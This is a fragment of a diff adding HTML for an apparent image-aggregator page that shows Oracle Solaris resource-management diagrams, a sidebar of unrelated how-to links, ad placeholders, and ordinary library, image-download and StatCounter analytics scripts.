+				<a href="https://docs.oracle.com/cd/E19112-01/ctr.mgr11/816-7751/images/databases3.epsi.gif" data-lightbox="roadtrip" title="Chapter 10 Advanced Usage (solaris Resource Manager 1.3 System  Administration Guide)">
+											<img class="card-img v-image" src="https://docs.oracle.com/cd/E19112-01/ctr.mgr11/816-7751/images/databases3.epsi.gif" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwTxyHr2Dz56l8olk6riU9Ene7QZWgr9uF_FzHCtIPzcZclDzF8ViFJwgyaVxWS7wrgEo';" alt="Chapter 10 Advanced Usage (Solaris Resource Manager 1.3 System  Administration Guide)">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>Chapter 10 Advanced Usage (solaris Resource Manager 1.3 System  Administration Guide)</h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://docs.oracle.com/cd/E19455-01/817-1592/images/rmperf.gif" data-lightbox="roadtrip" title="Part I Resource Management (system Administration Guide: Oracle Solaris  Containers-resource And Zones)">
+											<img class="card-img v-image" src="https://docs.oracle.com/cd/E19455-01/817-1592/images/rmperf.gif" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRcyVAHkEVLi8WP9L5fDZmnkFRz2DAwpKvQa8niMUq_XznXKaw1EhmlQk45Cdwn4mmM4og';" alt="Part I Resource Management (System Administration Guide: Oracle Solaris  Containers-Resource Management And Oracle Solaris Zones)">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>Part I Resource Management (system Administration Guide: Oracle Solaris  Containers-resource And Zones)</h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+		</div>
+							</div>
+				</div> 
+				<div class="col-md-3">
+        <div class="col-sm-12 widget">
+        <h3 class="widget-title">Partnership</h3>
+					</div>
+					<div class="col-sm-12 widget">
+						<h3 class="widget-title">Popular Posts</h3>
+						<ul class="list-group">
+													<li class="list-group-item"><a href="/how-to-lose-weight-on-lean-cuisine.html">How To Lose Weight On Lean Cuisine</a></li>
+													<li class="list-group-item"><a href="/how-to-fight-giga-bowser-in-melee.html">How To Fight Giga Bowser In Melee</a></li>
+													<li class="list-group-item"><a href="/how-to-draw-the-justice-league.html">How To Draw The Justice League</a></li>
+													<li class="list-group-item"><a href="/how-to-develop-a-operating-system.html">How To Develop A Operating System</a></li>
+													<li class="list-group-item"><a href="/how-to-increase-one-s-intelligence.html">How To Increase One S Intelligence</a></li>
+													<li class="list-group-item"><a href="/how-to-draw-hcl.html">How To Draw Hcl</a></li>
+													<li class="list-group-item"><a href="/how-to-ease-a-hangover.html">How To Ease A Hangover</a></li>
+													<li class="list-group-item"><a href="/how-to-find-out-if-your-company-is-for-sale.html">How To Find Out If Your Company Is For Sale</a></li>
+													<li class="list-group-item"><a href="/how-to-find-out-what-kind-of-graphics-card-you-have.html">How To Find Out What Kind Of Graphics Card You Have</a></li>
+													<li class="list-group-item"><a href="/how-to-deal-with-bipolar-girlfriend.html">How To Deal With Bipolar Girlfriend</a></li>
+													<li class="list-group-item"><a href="/how-to-find-out-if-you-are-adopted.html">How To Find Out If You Are Adopted</a></li>
+													<li class="list-group-item"><a href="/how-to-draw-buff-people.html">How To Draw Buff People</a></li>
+													<li class="list-group-item"><a href="/how-to-deal-with-territorial-dogs.html">How To Deal With Territorial Dogs</a></li>
+													<li class="list-group-item"><a href="/how-to-easily-catch-giratina.html">How To Easily Catch Giratina</a></li>
+													<li class="list-group-item"><a href="/how-to-draw-a-real-human-face.html">How To Draw A Real Human Face</a></li>
+													<li class="list-group-item"><a href="/how-to-prevent-getting-mono.html">How To Prevent Getting Mono</a></li>
+													<li class="list-group-item"><a href="/how-to-lose-weight-in-thigh-area.html">How To Lose Weight In Thigh Area</a></li>
+													<li class="list-group-item"><a href="/how-to-fix-div-height.html">How To Fix Div Height</a></li>
+													<li class="list-group-item"><a href="/how-to-cope-pipe.html">How To Cope Pipe</a></li>
+													<li class="list-group-item"><a href="/how-to-cook-rice-using-microwave.html">How To Cook Rice Using Microwave</a></li>
+						 
+						</ul>
+					</div>
+					<div class="col-sm-12 widget">
+					</br><!--ads/responsive.txt-->
+						<div class="d-block p-4">
+	<center>
+		<!-- SIDEBAR ADS -->
+	</center>
+</div>					</div>
+				</div> 
+				<div class="col-md-12 my-2" align="center">
+					<div class="d-block p-4">
+	<center>
+		<!-- BOTTOM BANNER ADS -->
+	</center>
+</div>				</div>
+			</div>
+			<div class="row footer">
+				<div class="col-md-12 text-center">
+					
+				</div>
+			</div>
+		</div>		
+	</main>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/js/all.min.js" integrity="sha256-MAgcygDRahs+F/Nk5Vz387whB4kSK9NXlDN3w58LLq0=" crossorigin="anonymous"></script>	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox.min.js" integrity="sha256-CtKylYan+AJuoH8jrMht1+1PMhMqrKnB8K5g012WN5I=" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/downloadjs/1.4.8/download.min.js"></script>
+	<!-- Footer CSS JS -->	
+	
+	
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/downloadjs/1.4.8/download.min.js"></script>
+	<script type='text/javascript'>
+		$(document).ready(function()
+	    {
+			$(document).on('click','#image-download',function(e)
+			{
+				e.preventDefault();
+				var url = $(this).data('url');
+				var title = $(this).data('title');			
+				var x=new XMLHttpRequest();
+				x.open( "GET", url , true);
+				x.responseType="blob";
+				x.onload= function(e){download(e.target.response, title, "image/jpg");};
+				x.send();
+			});
+	    });
+	</script>
+	<script type="text/javascript">
+var sc_project=12011803; 
+var sc_invisible=1; 
+var sc_security="ca0ad229"; 
+</script>
+<script type="text/javascript"
+src="https://www.statcounter.com/counter/counter.js"
+async></script>
+<noscript><div class="statcounter"><a title="real time web
+analytics" href="https://statcounter.com/"
+target="_blank"><img class="statcounter"
+src="https://c.statcounter.com/12011803/0/ca0ad229/1/"
+alt="real time web analytics"
+referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
+</body>
+</html>
